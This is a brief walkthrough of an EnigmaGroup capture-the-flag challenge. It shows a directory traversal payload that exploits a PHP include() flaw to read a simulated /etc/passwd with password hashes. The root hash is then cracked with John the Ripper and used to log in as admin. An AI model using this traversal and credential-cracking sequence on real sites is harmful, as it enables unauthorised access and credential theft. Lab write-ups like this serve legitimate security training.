Task on EnigmaGroup: http://challenges.enigmagroup.org/realistics/1/
Video Solution: https://youtu.be/qB7cQ1MqCqA


When you click on links you can see url like this in address bar:
     http://challenges.enigmagroup.org/realistics/1/?page=alt
We interested in ?page=alt, because it's look like directory traversal.
Try to change ?page=alt to this for example ?page=./ and we get response

You are on the right track. Psychomarine made a PHP include() coding flaw.
(This exploit is simulated. Only the correct path is accepted. Did you really think we would give you full access to our server?)

Good, now we know that PHP include() vulnerability is on site. Chage ?page=./ to ?page=../../../../../etc/passwd
In response we get /etc/passwd file:

root:4d1Yq6PXGzYm6:0:0:root:/root:/bin/bash
psychomarine:4doxGUy8UpD0o:500:500:psychomarine:/home/psychomarine:/bin/bash
mets0c30:4d.0gmeqJKnns:501:501:mets0c30:/home/mets0c30:/bin/bash
xero:4daaaoH4HRORM:502:502:xero:/home/xero:/bin/bash
cereal:4dhDNV4QowNPc:503:503:cereal:/home/cereal:/bin/bash
ausome1:4dNl9DNd9LXJw:504:504:ausome1:/home/ausome1:/bin/bash
ratboy:4dtpZl8gaHF86:505:505:ratboy:/home/ratboy:/bin/bash

Now use john the ripper to brute root passwd. It's simple password : 31337
Web admin page: http://enigmagroup.org:1337/ (From nmap)
Login with root and password, done.
